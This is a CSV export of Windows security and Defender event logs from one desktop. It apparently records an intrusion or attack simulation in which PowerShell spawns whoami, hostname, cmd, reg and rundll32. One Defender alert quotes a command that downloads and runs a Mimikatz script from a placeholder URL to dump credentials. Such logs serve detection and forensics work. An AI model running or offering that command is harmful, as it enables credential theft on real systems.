Level,Date and Time,Source,Event ID,Task Category,More Information
Information,15/04/2020 20:07,Microsoft-Windows-Security-Auditing,4688,Process Creation,"A new process has been created.

Creator Subject:
	Security ID:		DESKTOP-P8HTU4V\User
	Account Name:		User
	Account Domain:		DESKTOP-P8HTU4V
	Logon ID:		0x10344F

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x9e0
	New Process Name:	C:\Windows\System32\HOSTNAME.EXE
	Token Elevation Type:	%%1938
	Mandatory Label:		Mandatory Label\Medium Mandatory Level
	Creator Process ID:	0x3c4
	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Process Command Line:	

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator."
Information,15/04/2020 20:07,Microsoft-Windows-Security-Auditing,4688,Process Creation,"A new process has been created.

Creator Subject:
	Security ID:		DESKTOP-P8HTU4V\User
	Account Name:		User
	Account Domain:		DESKTOP-P8HTU4V
	Logon ID:		0x10344F

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x17f8
	New Process Name:	C:\Windows\System32\whoami.exe
	Token Elevation Type:	%%1938
	Mandatory Label:		Mandatory Label\Medium Mandatory Level
	Creator Process ID:	0x3c4
	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Process Command Line:	

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator."
Information,15/04/2020 20:07,Microsoft-Windows-Security-Auditing,4688,Process Creation,"A new process has been created.

Creator Subject:
	Security ID:		DESKTOP-P8HTU4V\User
	Account Name:		User
	Account Domain:		DESKTOP-P8HTU4V
	Logon ID:		0x10344F

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0xcc4
	New Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Token Elevation Type:	%%1938
	Mandatory Label:		Mandatory Label\Medium Mandatory Level
	Creator Process ID:	0x3c4
	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Process Command Line:	

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator."
Information,15/04/2020 20:07,Microsoft-Windows-Security-Auditing,4688,Process Creation,"A new process has been created.

Creator Subject:
	Security ID:		SYSTEM
	Account Name:		DESKTOP-P8HTU4V$
	Account Domain:		WORKGROUP
	Logon ID:		0x3E7

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x177c
	New Process Name:	C:\Windows\System32\SearchProtocolHost.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\System Mandatory Level
	Creator Process ID:	0xe90
	Creator Process Name:	C:\Windows\System32\SearchIndexer.exe
	Process Command Line:	

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator."
Information,15/04/2020 20:07,Microsoft-Windows-Security-Auditing,4670,Authorization Policy Change,"Permissions on an object were changed.

Subject:
	Security ID:		SYSTEM
	Account Name:		DESKTOP-P8HTU4V$
	Account Domain:		WORKGROUP
	Logon ID:		0x3E7

Object:
	Object Server:	Security
	Object Type:	Token
	Object Name:	-
	Handle ID:	0x998

Process:
	Process ID:	0xe90
	Process Name:	C:\Windows\System32\SearchIndexer.exe

Permissions Change:
	Original Security Descriptor:	D:(A;;GA;;;SY)(A;;RC;;;OW)(A;;GA;;;S-1-5-80-117416528-2204451360-1913602512-1355018040-1234992034)(A;;GA;;;BA)(A;;GA;;;SY)
	New Security Descriptor:	D:(A;;GA;;;SY)(A;;RC;;;OW)(A;;GA;;;S-1-5-80-117416528-2204451360-1913602512-1355018040-1234992034)(A;;GA;;;BA)(A;;GA;;;SY)(A;;GA;;;BA)"
Information,15/04/2020 20:07,Microsoft-Windows-Security-Auditing,4670,Authorization Policy Change,"Permissions on an object were changed.

Subject:
	Security ID:		SYSTEM
	Account Name:		DESKTOP-P8HTU4V$
	Account Domain:		WORKGROUP
	Logon ID:		0x3E7

Object:
	Object Server:	Security
	Object Type:	Token
	Object Name:	-
	Handle ID:	0x998

Process:
	Process ID:	0xe90
	Process Name:	C:\Windows\System32\SearchIndexer.exe

Permissions Change:
	Original Security Descriptor:	D:(A;;GA;;;SY)(A;;RC;;;OW)(A;;GA;;;S-1-5-80-117416528-2204451360-1913602512-1355018040-1234992034)(A;;GA;;;BA)(A;;GA;;;SY)(A;;GA;;;BA)
	New Security Descriptor:	D:(A;;GA;;;SY)(A;;RC;;;OW)(A;;GA;;;S-1-5-80-117416528-2204451360-1913602512-1355018040-1234992034)(A;;GA;;;BA)(A;;GA;;;SY)(A;;GA;;;BA)(A;;GA;;;SY)"
Information,15/04/2020 20:07,Microsoft-Windows-Security-Auditing,4670,Authorization Policy Change,"Permissions on an object were changed.

Subject:
	Security ID:		SYSTEM
	Account Name:		DESKTOP-P8HTU4V$
	Account Domain:		WORKGROUP
	Logon ID:		0x3E7

Object:
	Object Server:	Security
	Object Type:	Token
	Object Name:	-
	Handle ID:	0x344

Process:
	Process ID:	0xe90
	Process Name:	C:\Windows\System32\SearchIndexer.exe

Permissions Change:
	Original Security Descriptor:	D:(A;;GA;;;SY)(A;;RC;;;OW)(A;;GA;;;S-1-5-80-117416528-2204451360-1913602512-1355018040-1234992034)(A;;GA;;;BA)(A;;GA;;;SY)
	New Security Descriptor:	D:(A;;GA;;;SY)(A;;RC;;;OW)(A;;GA;;;S-1-5-80-117416528-2204451360-1913602512-1355018040-1234992034)(A;;GA;;;BA)(A;;GA;;;SY)(A;;SWRPRC;;;S-1-5-5-0-553818)"
Information,15/04/2020 20:07,Microsoft-Windows-Security-Auditing,4688,Process Creation,"A new process has been created.

Creator Subject:
	Security ID:		SYSTEM
	Account Name:		DESKTOP-P8HTU4V$
	Account Domain:		WORKGROUP
	Logon ID:		0x3E7

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0xf80
	New Process Name:	C:\Windows\System32\SearchFilterHost.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\Medium Mandatory Level
	Creator Process ID:	0xe90
	Creator Process Name:	C:\Windows\System32\SearchIndexer.exe
	Process Command Line:	

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator."
Information,15/04/2020 20:07,Microsoft-Windows-Security-Auditing,4688,Process Creation,"A new process has been created.

Creator Subject:
	Security ID:		DESKTOP-P8HTU4V\User
	Account Name:		User
	Account Domain:		DESKTOP-P8HTU4V
	Logon ID:		0x10344F

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0xb8c
	New Process Name:	C:\Windows\System32\cmd.exe
	Token Elevation Type:	%%1938
	Mandatory Label:		Mandatory Label\Medium Mandatory Level
	Creator Process ID:	0x3c4
	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Process Command Line:	

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator."
Information,15/04/2020 20:07,Microsoft-Windows-Security-Auditing,4688,Process Creation,"A new process has been created.

Creator Subject:
	Security ID:		DESKTOP-P8HTU4V\User
	Account Name:		User
	Account Domain:		DESKTOP-P8HTU4V
	Logon ID:		0x10344F

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x7bc
	New Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Token Elevation Type:	%%1938
	Mandatory Label:		Mandatory Label\Medium Mandatory Level
	Creator Process ID:	0x3c4
	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Process Command Line:	

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator."
Information,15/04/2020 20:07,Microsoft-Windows-Security-Auditing,4688,Process Creation,"A new process has been created.

Creator Subject:
	Security ID:		DESKTOP-P8HTU4V\User
	Account Name:		User
	Account Domain:		DESKTOP-P8HTU4V
	Logon ID:		0x10344F

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x5d0
	New Process Name:	C:\Windows\System32\cmd.exe
	Token Elevation Type:	%%1938
	Mandatory Label:		Mandatory Label\Medium Mandatory Level
	Creator Process ID:	0x3c4
	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Process Command Line:	

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator."
Warning,15/04/2020 20:07,Microsoft-Windows-Windows Defender,1116,None,"Windows Defender Antivirus has detected malware or other potentially unwanted software.
 For more information please see the following:
https://go.microsoft.com/fwlink/?linkid=37020&name=Trojan:PowerShell/Mimikatz.A&threatid=2147725502&enterprise=0
 	Name: Trojan:PowerShell/Mimikatz.A
 	ID: 2147725502
 	Severity: Severe
 	Category: Trojan
 	Path: CmdLine:_C:\Windows\System32\cmd.exe /c PWS_EXECUTABLE IEX (New-Object Net.WebClient).DownloadString('GITHUB_MIMIKATZ_PWS'); Invoke-Mimikatz -DumpCreds
 	Detection Origin: Unknown
 	Detection Type: Concrete
 	Detection Source: System
 	User: NT AUTHORITY\SYSTEM
 	Process Name: Unknown
 	Security intelligence Version: AV: 1.313.1512.0, AS: 1.313.1512.0, NIS: 1.313.1512.0
 	Engine Version: AM: 1.1.16900.4, NIS: 1.1.16900.4"
Information,15/04/2020 20:07,Microsoft-Windows-Security-Auditing,4688,Process Creation,"A new process has been created.

Creator Subject:
	Security ID:		SYSTEM
	Account Name:		DESKTOP-P8HTU4V$
	Account Domain:		WORKGROUP
	Logon ID:		0x3E7

Target Subject:
	Security ID:		DESKTOP-P8HTU4V\User
	Account Name:		User
	Account Domain:		DESKTOP-P8HTU4V
	Logon ID:		0x10344F

Process Information:
	New Process ID:		0x103c
	New Process Name:	C:\Windows\System32\SecurityHealthHost.exe
	Token Elevation Type:	%%1938
	Mandatory Label:		Mandatory Label\Medium Mandatory Level
	Creator Process ID:	0x2f8
	Creator Process Name:	C:\Windows\System32\svchost.exe
	Process Command Line:	

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator."
Information,15/04/2020 20:07,Microsoft-Windows-Security-Auditing,4688,Process Creation,"A new process has been created.

Creator Subject:
	Security ID:		DESKTOP-P8HTU4V\User
	Account Name:		User
	Account Domain:		DESKTOP-P8HTU4V
	Logon ID:		0x10344F

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x1714
	New Process Name:	C:\Windows\System32\cmd.exe
	Token Elevation Type:	%%1938
	Mandatory Label:		Mandatory Label\Medium Mandatory Level
	Creator Process ID:	0x3c4
	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Process Command Line:	

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator."
Information,15/04/2020 20:07,Microsoft-Windows-Security-Auditing,4673,Sensitive Privilege Use,"A privileged service was called.

Subject:
	Security ID:		DESKTOP-P8HTU4V\User
	Account Name:		User
	Account Domain:		DESKTOP-P8HTU4V
	Logon ID:		0x10344F

Service:
	Server:	Security
	Service Name:	-

Process:
	Process ID:	0x2f8
	Process Name:	C:\Windows\System32\svchost.exe

Service Request Information:
	Privileges:		SeTcbPrivilege"
Information,15/04/2020 20:07,Microsoft-Windows-Security-Auditing,4688,Process Creation,"A new process has been created.

Creator Subject:
	Security ID:		SYSTEM
	Account Name:		DESKTOP-P8HTU4V$
	Account Domain:		WORKGROUP
	Logon ID:		0x3E7

Target Subject:
	Security ID:		DESKTOP-P8HTU4V\User
	Account Name:		User
	Account Domain:		DESKTOP-P8HTU4V
	Logon ID:		0x10344F

Process Information:
	New Process ID:		0xea0
	New Process Name:	C:\Windows\SystemApps\ShellExperienceHost_cw5n1h2txyewy\ShellExperienceHost.exe
	Token Elevation Type:	%%1938
	Mandatory Label:		Mandatory Label\Low Mandatory Level
	Creator Process ID:	0x2f8
	Creator Process Name:	C:\Windows\System32\svchost.exe
	Process Command Line:	

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator."
Warning,15/04/2020 20:07,Microsoft-Windows-DistributedCOM,10016,None,"The machine-default permission settings do not grant Local Activation permission for the COM Server application with CLSID 
{C2F03A33-21F5-47FA-B4BB-156362A2F239}
 and APPID 
{316CDED5-E4AE-4B15-9113-7055D84DCC97}
 to the user DESKTOP-P8HTU4V\User SID (S-1-5-21-887719237-3143055800-1059174887-1001) from address LocalHost (Using LRPC) running in the application container Microsoft.Windows.ShellExperienceHost_10.0.18362.387_neutral_neutral_cw5n1h2txyewy SID (S-1-15-2-155514346-2573954481-755741238-1654018636-1233331829-3075935687-2861478708). This security permission can be modified using the Component Services administrative tool."
Information,15/04/2020 20:07,Microsoft-Windows-Security-Auditing,4688,Process Creation,"A new process has been created.

Creator Subject:
	Security ID:		LOCAL SERVICE
	Account Name:		LOCAL SERVICE
	Account Domain:		NT AUTHORITY
	Logon ID:		0x3E5

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0xcf0
	New Process Name:	C:\Windows\System32\audiodg.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\System Mandatory Level
	Creator Process ID:	0x758
	Creator Process Name:	C:\Windows\System32\svchost.exe
	Process Command Line:	

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator."
Information,15/04/2020 20:07,Microsoft-Windows-Security-Auditing,4688,Process Creation,"A new process has been created.

Creator Subject:
	Security ID:		SYSTEM
	Account Name:		DESKTOP-P8HTU4V$
	Account Domain:		WORKGROUP
	Logon ID:		0x3E7

Target Subject:
	Security ID:		DESKTOP-P8HTU4V\User
	Account Name:		User
	Account Domain:		DESKTOP-P8HTU4V
	Logon ID:		0x10344F

Process Information:
	New Process ID:		0x11a8
	New Process Name:	C:\Windows\System32\RuntimeBroker.exe
	Token Elevation Type:	%%1938
	Mandatory Label:		Mandatory Label\Medium Mandatory Level
	Creator Process ID:	0x2f8
	Creator Process Name:	C:\Windows\System32\svchost.exe
	Process Command Line:	

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator."
Information,15/04/2020 20:07,Microsoft-Windows-Security-Auditing,4688,Process Creation,"A new process has been created.

Creator Subject:
	Security ID:		DESKTOP-P8HTU4V\User
	Account Name:		User
	Account Domain:		DESKTOP-P8HTU4V
	Logon ID:		0x10344F

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x14c0
	New Process Name:	C:\Windows\System32\cmd.exe
	Token Elevation Type:	%%1938
	Mandatory Label:		Mandatory Label\Medium Mandatory Level
	Creator Process ID:	0x3c4
	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Process Command Line:	

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator."
Information,15/04/2020 20:07,Microsoft-Windows-Security-Auditing,4688,Process Creation,"A new process has been created.

Creator Subject:
	Security ID:		DESKTOP-P8HTU4V\User
	Account Name:		User
	Account Domain:		DESKTOP-P8HTU4V
	Logon ID:		0x10344F

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x1644
	New Process Name:	C:\Windows\System32\reg.exe
	Token Elevation Type:	%%1938
	Mandatory Label:		Mandatory Label\Medium Mandatory Level
	Creator Process ID:	0x14c0
	Creator Process Name:	C:\Windows\System32\cmd.exe
	Process Command Line:	

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator."
Information,15/04/2020 20:07,Microsoft-Windows-Security-Auditing,4688,Process Creation,"A new process has been created.

Creator Subject:
	Security ID:		DESKTOP-P8HTU4V\User
	Account Name:		User
	Account Domain:		DESKTOP-P8HTU4V
	Logon ID:		0x10344F

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0xbe0
	New Process Name:	C:\Windows\System32\reg.exe
	Token Elevation Type:	%%1938
	Mandatory Label:		Mandatory Label\Medium Mandatory Level
	Creator Process ID:	0x14c0
	Creator Process Name:	C:\Windows\System32\cmd.exe
	Process Command Line:	

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator."
Information,15/04/2020 20:07,Microsoft-Windows-Security-Auditing,4688,Process Creation,"A new process has been created.

Creator Subject:
	Security ID:		DESKTOP-P8HTU4V\User
	Account Name:		User
	Account Domain:		DESKTOP-P8HTU4V
	Logon ID:		0x10344F

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x1630
	New Process Name:	C:\Windows\System32\reg.exe
	Token Elevation Type:	%%1938
	Mandatory Label:		Mandatory Label\Medium Mandatory Level
	Creator Process ID:	0x14c0
	Creator Process Name:	C:\Windows\System32\cmd.exe
	Process Command Line:	

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator."
Information,15/04/2020 20:07,Microsoft-Windows-Security-Auditing,4688,Process Creation,"A new process has been created.

Creator Subject:
	Security ID:		DESKTOP-P8HTU4V\User
	Account Name:		User
	Account Domain:		DESKTOP-P8HTU4V
	Logon ID:		0x10344F

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0xcd0
	New Process Name:	C:\Windows\System32\cmd.exe
	Token Elevation Type:	%%1938
	Mandatory Label:		Mandatory Label\Medium Mandatory Level
	Creator Process ID:	0x3c4
	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Process Command Line:	

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator."
Information,15/04/2020 20:07,Microsoft-Windows-Security-Auditing,4688,Process Creation,"A new process has been created.

Creator Subject:
	Security ID:		DESKTOP-P8HTU4V\User
	Account Name:		User
	Account Domain:		DESKTOP-P8HTU4V
	Logon ID:		0x10344F

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0xb64
	New Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Token Elevation Type:	%%1938
	Mandatory Label:		Mandatory Label\Medium Mandatory Level
	Creator Process ID:	0x3c4
	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Process Command Line:	

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator."
Information,15/04/2020 20:07,Microsoft-Windows-Security-Auditing,4688,Process Creation,"A new process has been created.

Creator Subject:
	Security ID:		DESKTOP-P8HTU4V\User
	Account Name:		User
	Account Domain:		DESKTOP-P8HTU4V
	Logon ID:		0x10344F

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x5c
	New Process Name:	C:\Windows\System32\rundll32.exe
	Token Elevation Type:	%%1938
	Mandatory Label:		Mandatory Label\Medium Mandatory Level
	Creator Process ID:	0xb64
	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Process Command Line:	

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator."
Information,15/04/2020 20:07,Microsoft-Windows-Security-Auditing,4688,Process Creation,"A new process has been created.

Creator Subject:
	Security ID:		DESKTOP-P8HTU4V\User
